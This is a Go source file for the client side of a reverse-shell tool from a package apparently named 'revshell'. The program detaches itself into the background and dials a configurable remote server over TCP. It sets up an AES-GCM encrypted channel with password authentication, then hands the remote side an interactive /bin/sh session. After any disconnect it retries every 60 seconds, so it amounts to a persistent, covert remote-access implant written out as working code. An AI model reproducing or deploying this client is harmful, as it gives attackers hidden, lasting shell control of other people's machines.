package main

import (
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"time"

	"revshell/pkg/secureio"
	"revshell/pkg/terminal"
)

type clientOptions struct {
	addr         string
	aesKey       string
	authPassword string
	shell        string
	prompt       string
	workdir      string
}

func main() {
	opts := parseFlags()

	if err := daemonize(); err != nil {
		log.Fatalf("client: failed to daemonize: %v", err)
	}

	const reconnectDelay = 60 * time.Second

	for {
		if err := runClient(opts); err != nil {
			if errors.Is(err, io.EOF) {
				log.Printf("client: connection closed, reconnecting")
			} else {
				log.Printf("client: session ended with error: %v", err)
			}
		} else {
			log.Printf("client: session ended, reconnecting")
		}

		log.Printf("client: waiting %s before retrying", reconnectDelay)
		time.Sleep(reconnectDelay)
	}
}

func runClient(opts clientOptions) error {
	conn, err := net.Dial("tcp", opts.addr)
	if err != nil {
		return fmt.Errorf("failed to connect to %s: %w", opts.addr, err)
	}
	defer conn.Close()

	transport, err := secureio.Handshake(conn, false, opts.aesKey, opts.authPassword)
	if err != nil {
		return fmt.Errorf("handshake failed: %w", err)
	}

	log.Printf("client: connected to %s with AES-GCM encryption", opts.addr)

	sessionOpts := terminal.Options{Prompt: opts.prompt, Shell: opts.shell, InitialDir: opts.workdir}
	session, err := terminal.NewSession(transport.Reader(), transport.Writer(), sessionOpts)
	if err != nil {
		return fmt.Errorf("failed to create session: %w", err)
	}

	if resizeEvents := transport.ResizeEvents(); resizeEvents != nil {
		session.SetResizeEvents(resizeEvents)
	}

	return session.Run()
}

func parseFlags() clientOptions {
	addr := flag.String("server", "127.0.0.1:9999", "remote server address")
	aesKey := flag.String("aes-key", "", "shared AES key or passphrase")
	authPass := flag.String("auth-password", "", "authentication password")
	shell := flag.String("shell", "/bin/sh", "shell executable used to run commands")
	prompt := flag.String("prompt", "", "prompt template forwarded to the remote shell (supports {{.USER}}, {{.HOST}}, {{.CWD}}, {{.BASENAME}})")
	workdir := flag.String("workdir", "", "initial working directory for new sessions")
	flag.Parse()

	missing := false
	if *aesKey == "" {
		fmt.Fprintln(os.Stderr, "client: --aes-key must be provided")
		missing = true
	}
	if *authPass == "" {
		fmt.Fprintln(os.Stderr, "client: --auth-password must be provided")
		missing = true
	}
	if missing {
		os.Exit(1)
	}

	return clientOptions{
		addr:         *addr,
		aesKey:       *aesKey,
		authPassword: *authPass,
		shell:        *shell,
		prompt:       *prompt,
		workdir:      *workdir,
	}
}
